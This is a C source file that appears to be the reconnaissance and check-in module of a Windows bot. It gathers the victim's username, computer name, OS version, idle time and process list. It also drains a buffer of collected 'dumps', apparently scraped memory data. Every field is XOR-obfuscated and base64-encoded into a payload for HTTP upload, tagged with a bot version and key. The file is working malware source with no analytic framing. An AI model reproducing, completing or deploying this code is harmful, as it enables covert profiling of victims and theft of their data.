#include <windows.h>
#include <tlhelp32.h>


#include "Globals.h"
#include "Config.h"

#define VER_SUITE_WH_SERVER 0x00008000
#define SM_SERVERR2 89

typedef void (WINAPI *__GetNativeSystemInfo)(LPSYSTEM_INFO);

void GetOSVersion(char *OS) {

	OSVERSIONINFOEX osi;
	SYSTEM_INFO si;
	__GetNativeSystemInfo _GetNativeSystemInfo;


	_memset(&osi,0x00,sizeof(osi));
	_memset(&si,0x00,sizeof(si));
	osi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);


	if(x64==TRUE) { //we are runnning on x64
		_GetNativeSystemInfo = (__GetNativeSystemInfo) GetProcAddress(GetModuleHandle("kernel32.dll"),"GetNativeSystemInfo");
		_GetNativeSystemInfo(&si);
	} else { //we are running on x86
		GetSystemInfo(&si);
	}
		
	GetVersionEx((OSVERSIONINFO *)&osi);

	if(osi.dwMajorVersion==5 && osi.dwMinorVersion==0) {
		lstrcpy(OS,"Windows 2000");
		return;
	} 

	if(osi.dwMajorVersion==5 && osi.dwMinorVersion==1) {
		lstrcpy(OS,"Windows XP");
		return;
	}

	if(osi.dwMajorVersion==5 && osi.dwMinorVersion==2) {
		if((osi.wProductType == VER_NT_WORKSTATION) && (si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)) {
			lstrcpy(OS,"Windows XP Professional x64");
			return;
		}
		if(GetSystemMetrics(SM_SERVERR2)==0) {
			lstrcpy(OS,"Windows Server 2003");
			return;
		}
		if((osi.wSuiteMask & VER_SUITE_WH_SERVER)==0) {
			lstrcpy(OS,"Windows Home Server");
			return;
		}
		if(GetSystemMetrics(SM_SERVERR2)!=0) {
			lstrcpy(OS,"Windows Server 2003 R2");
			return;
		}

	}

	if(osi.dwMajorVersion==6 && osi.dwMinorVersion==0) {
		if(osi.wProductType == VER_NT_WORKSTATION) {
			lstrcpy(OS,"Windows Vista");
			return;
		}
		if(osi.wProductType != VER_NT_WORKSTATION) {
			lstrcpy(OS,"Windows Server 2008");
			return;
		}
	}
	if(osi.dwMajorVersion==6 && osi.dwMinorVersion==1) {
		if(osi.wProductType != VER_NT_WORKSTATION) {
			lstrcpy(OS,"Windows Server R2");
			return;
		}
		if(osi.wProductType == VER_NT_WORKSTATION) {
			lstrcpy(OS,"Windows 7");
			return;
		}
	}

}

void GetIdleTime(char *Idle) { //returns Idle time in seconds as String

	DWORD tickCount,idleCount;
	LASTINPUTINFO lif;

	_memset(&lif,0x00,sizeof(lif));
	lif.cbSize = sizeof(LASTINPUTINFO);

	_GetLastInputInfo(&lif);
	tickCount = GetTickCount();
	idleCount = (tickCount - lif.dwTime) / 1000;
	wsprintf(Idle,"%d",idleCount);
}

char *GetProcList() {

	HANDLE hSnapShot,hProcess;
	PROCESSENTRY32 ProcInfo;
	char FullPath[MAX_PATH],*ProcList,*NewProcList;
	DWORD size,staticSize;

	_memset(&ProcInfo,0x00,sizeof(PROCESSENTRY32));
	ProcInfo.dwSize = sizeof(PROCESSENTRY32);

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	Process32First(hSnapShot,&ProcInfo);


	size = 0;
	staticSize = 4096;
	ProcList = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,staticSize); //alloc static memory for the proc list
	_memset(ProcList,0x00,staticSize);

	do{

		hProcess = NULL;

		_memset(FullPath,0x00,sizeof(FullPath));
		wsprintf(FullPath,"%s\n",ProcInfo.szExeFile);
		
		size = size + lstrlenA(FullPath);
		if(size>staticSize) { 

			NewProcList = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,size);
			_memset(NewProcList,0x00,size);
			lstrcpyA(NewProcList,ProcList);
			HeapFree(hHeap,HEAP_ZERO_MEMORY,ProcList);
			staticSize = size;
			ProcList = NewProcList;
		}
		lstrcatA(ProcList,FullPath);
		
		if(hProcess!=NULL) { CloseHandle(hProcess); }
	} while(Process32Next(hSnapShot,&ProcInfo));

	CloseHandle(hSnapShot);


	return ProcList;
}

void CryptEncodeCombine(char *VarName,char *VarData,char *GlobalVar);

void GatherInfo(BOOL fFullInfo) { //fFullInfo - TRUE = gather full info, executed only at first connect.
	                              //fFullInfo - FALSE = gather only runtime changing info, execute at every check

	char UID[37],Username[64],Computername[64],OS[64],Arch[10],Idle[10],*ProcList;
	DWORD Size,TotalSize;

	if(fFullInfo==TRUE) { TotalSize = fullVarSize; } else { TotalSize = runtimeVarSize; }

	if(fFullInfo==TRUE) { //We gather full info

	//Get Username
	_memset(Username,0x00,sizeof(Username));
	Size = sizeof(Username);
	GetUserName(Username,&Size);
	TotalSize += lstrlen(Username);

	//Get Computer Name
	_memset(Computername,0x00,sizeof(Computername));
	Size = sizeof(Computername);
	GetComputerName(Computername,&Size);
	TotalSize += lstrlen(Computername);

	//Get OS Version Name
	_memset(OS,0x00,sizeof(OS));
	GetOSVersion(OS);
	TotalSize += lstrlen(OS);

	//Get Architecture
	if(x64==TRUE) { lstrcpy(Arch,"64 Bit"); } else { lstrcpy(Arch,"32 Bit"); }
	TotalSize += lstrlen(Arch);

	} 

	//Get UID
	lstrcpy(UID,Uniq);
	TotalSize += lstrlen(UID);

	//Get Idle Time In Seconds
	_memset(Idle,0x00,sizeof(Idle));
	GetIdleTime(Idle);
	TotalSize += lstrlen(Idle);

	//Get process list - need to free it later
	ProcList = GetProcList();
	TotalSize += lstrlen(ProcList);

	//Get dumps - we directly use the buffer, then zero it and zero the size variables
	EnterCriticalSection(&crsBlob);

	TotalSize += GrowSize;
	//Alloc the pHttpData
	pHttpData = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,(2*TotalSize)); //Because base64 increase buffer size by around 1.33
	CryptEncodeCombine(varUID,UID,pHttpData); //UID has to be first always
	///////////////////////////////////////

	if(GrowSize>0) {

	pBlob -= GrowSize;
	//MessageBox(NULL,pBlob,NULL,MB_OK);
	CryptEncodeCombine(varDumps,pBlob,pHttpData);
	_memset(pBlob,0x00,GrowSize);
	GrowSize = 0;
	}
	LeaveCriticalSection(&crsBlob);
    /////////////////////////////////////////////////

	if(fFullInfo==TRUE) {
		
		CryptEncodeCombine(varUsername,Username,pHttpData);
		CryptEncodeCombine(varComputername,Computername,pHttpData);
		CryptEncodeCombine(varOS,OS,pHttpData);
		CryptEncodeCombine(varArch,Arch,pHttpData);
	}

	CryptEncodeCombine(varIdle,Idle,pHttpData);
	CryptEncodeCombine(varProclist,ProcList,pHttpData);

	//Add the bot version
	lstrcpy(BotVersion,Version);
	CryptEncodeCombine(varVersion,BotVersion,pHttpData);

	//Add the xor key
	lstrcat(pHttpData,varKey); 
	lstrcat(pHttpData,EncodedKey);

	HeapFree(hHeap,0,ProcList);
	//MessageBox(NULL,pHttpData,NULL,MB_OK);
}

void CryptEncodeCombine(char *VarName,char *VarData,char *GlobalVar) {

	int Size;
	char *pEncoded;

	Size = lstrlenA(VarData);
	pEncoded = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,Size*2); //CUZ COMPRESSION IS DISABLED

	//crypt with xor
	_xor(VarData,Key,Size,lstrlenA(Key));

	//encode with base64
	base64_encode(VarData,Size,pEncoded,Size*2);


	lstrcatA(GlobalVar,VarName);
	lstrcatA(GlobalVar,pEncoded);

	HeapFree(hHeap,0,pEncoded);
}
